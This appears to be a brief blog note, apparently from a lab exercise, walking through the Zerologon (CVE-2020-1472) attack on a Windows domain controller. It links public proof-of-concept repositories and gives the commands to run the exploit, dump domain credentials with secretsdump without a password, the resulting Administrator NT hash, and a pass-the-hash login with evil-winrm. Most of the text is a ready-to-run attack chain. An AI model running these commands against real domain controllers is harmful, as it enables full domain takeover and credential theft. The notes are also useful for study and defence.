---
title: Zero Logon CVE
author: Yuchao
date: 2022-05-17 11:33:00 +0800
categories: [sec]
tags: [cve]
math: true
mermaid: true
---

# Zero Logon

# CVE-2020-1472
- abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol)
- AES-CFB8 with hard coded IV.
- <https://github.com/SecuraBV/CVE-2020-1472>, the POC
- <https://github.com/Sq00ky/Zero-Logon-Exploit>, change password to null after exploit

# step
#### impacket installation
```
python3 -m pip install virtualenv

python3 -m virtualenv impacketEnv

source impacketEnv/bin/activate

pip install git+https://github.com/SecureAuthCorp/impacket
```

# recon
use nmap -sC -sV

# exploit
```
python3 zerologon.py DC01 10.10.166.73
```

# dump
```
python3 secretdump.py -just-dc -no-pass DC01\$@10.10.166.73
```

NT hash is 3f3ef89114fb063e3d7fc23c20f65568
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
```

Domain Admin accounts
- starts with a-, like a-fubukis, a-koronei. 

#### login by evil-winrm
```
evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.166.73
```
